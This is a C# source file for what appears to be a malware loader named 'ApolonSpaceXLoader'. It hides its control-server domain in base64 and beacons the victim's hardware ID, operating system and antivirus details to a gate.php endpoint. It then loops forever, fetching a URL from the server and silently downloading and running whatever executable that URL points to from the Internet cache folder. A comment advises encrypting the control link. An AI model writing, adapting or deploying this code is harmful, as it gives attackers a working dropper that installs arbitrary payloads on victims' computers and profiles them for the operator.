using System;
using System.Net;
using System.Text;
using System.Diagnostics;
using System.Threading;
using System.IO;
using System.Threading.Tasks;

namespace ApolonSpaceXLoader
{
    class Program
    {
        private static readonly string dom = Encoding.UTF8.GetString(Convert.FromBase64String("Encrypt domen"));  // use EncrDecr for encrypt your link on URL page. http://apolon.com -> aHR0cDovL2Fwb2xvbi5jb20vZ2F0ZS5waHA/
        public static string Gate = $"{dom}/gate.php?hwid={Helper.HWID()}&os={Helper.GetOSInformation()}&av={Helper.AV()}";
        public static string urlPage = dom + "/loader.txt";

        static void Main(string[] args)
        {
            try
            {
                while (true)
                {
                    WebClient wc = new WebClient();
                    string rnd = Helper.RandomID();
                    string dropPath = $"{Environment.GetFolderPath(Environment.SpecialFolder.InternetCache)}\\{rnd}.exe";

                    string urlOnPage;
                    using (StreamReader strr = new StreamReader(HttpWebRequest.Create(urlPage).GetResponse().GetResponseStream()))
                    {
                        urlOnPage = strr.ReadToEnd();
                    }

                    MyRegistry.Check();
                    if (MyRegistry.GetURL() != null)
                    {
                        if (MyRegistry.GetURL() != urlOnPage)
                        {
                            if (File.Exists($"{dropPath}\\{rnd}.exe"))
                            {
                                File.Delete($"{dropPath}\\{rnd}.exe");
                            }
                            MyRegistry.SetURL(urlOnPage);
                            if (urlOnPage.Length > 0)
                            {
                                wc.DownloadFile(urlOnPage, $"{dropPath}\\{rnd}.exe");
                                Process.Start($"{dropPath}\\{rnd}.exe");
                            }
                        }
                    }
                    wc.Dispose();
                    Thread.Sleep(3000);
                }
            }
            catch { }
        }
    }
}
